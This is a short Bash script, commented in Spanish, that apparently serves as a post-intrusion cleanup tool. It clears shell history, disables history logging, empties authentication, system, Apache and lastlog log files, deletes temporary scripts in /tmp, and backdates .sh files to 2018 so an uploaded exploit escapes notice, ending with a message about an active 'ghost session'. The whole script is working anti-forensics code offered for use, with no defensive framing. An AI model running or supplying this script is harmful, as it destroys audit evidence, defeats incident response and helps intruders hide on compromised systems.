#!/bin/bash

echo "[*] Iniciando limpieza de rastros..."

# 1. Borrar el historial de Bash (la prueba más obvia)
echo "[>] Limpiando historial de comandos..."
history -c
cat /dev/null > ~/.bash_history
unset HISTFILE

# 2. Limpiar logs del sistema (requiere privilegios o ser parte del grupo adm)
echo "[>] Vaciando archivos de logs críticos..."
logs=("/var/log/auth.log" "/var/log/syslog" "/var/log/apache2/access.log" "/var/log/lastlog")
for log in "${logs[@]}"; do
    if [ -f "$log" ]; then
        cat /dev/null > "$log" 2>/dev/null
    fi
done

# 3. Borrar archivos temporales creados por nosotros
echo "[>] Eliminando archivos temporales..."
rm -rf /tmp/*.sh /tmp/proc_* /tmp/temp_* 2>/dev/null

# 4. Timestomping (Cambiar fechas de archivos)
# Si subiste un exploit, esto cambia su fecha a una del año 2018 para que no resalte
echo "[>] Aplicando Timestomping a archivos restantes..."
find . -name "*.sh" -exec touch -t 201801011200 {} +

echo "[+] Limpieza completada. Sesión 'fantasma' activa."